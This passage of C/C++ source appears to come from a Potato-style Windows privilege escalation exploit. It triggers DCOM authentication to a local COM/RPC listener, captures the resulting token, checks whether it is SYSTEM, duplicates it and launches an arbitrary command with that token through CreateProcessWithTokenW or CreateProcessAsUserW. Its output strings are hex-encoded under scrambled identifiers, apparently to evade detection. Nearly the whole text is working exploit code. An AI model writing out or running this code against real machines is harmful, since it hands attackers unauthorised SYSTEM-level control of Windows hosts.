	const char  hid______C_pXvUACGbFd3U[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};

	const char  hid______C_zQWZPHXTuEV8[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x4f','\x4b','\n',0};

	const char  hid_Waitin_WR0QZWSnlnas[] = {'\x57','\x61','\x69','\x74','\x69','\x6e','\x67','\x20','\x66','\x6f','\x72','\x20','\x61','\x75','\x74','\x68','\x2e','\x2e','\x2e',0};
PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf(hid_Testin_a7niVJ5dsoNp, olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf(hid______a_mJv3CGMVQxDJ, test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, hid_S_e_I__44QHepiAJdn3);
			EnablePriv(hToken, hid_S_e_A__IveEnXEZddyC);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_____Er_S2RrXk61rJ2Z, GetLastError());

			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_Error__mxEYfbusA8mP, GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessWithTokenW(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf(hid______C_aOjWbZ2H6RAS, GetLastError());
				}
				else
				{
					printf(hid______C_1fXXQsg74Pf8);
					break;
				}
			} 

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessAsUserW(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					hid_C______P5DP3n5u8Boo, &si, &pi
				);

				if (!result) {
					printf(hid______C_pXvUACGbFd3U, GetLastError());
				}
				else {
					printf(hid______C_zQWZPHXTuEV8);
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf(hid_Waitin_WR0QZWSnlnas);
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
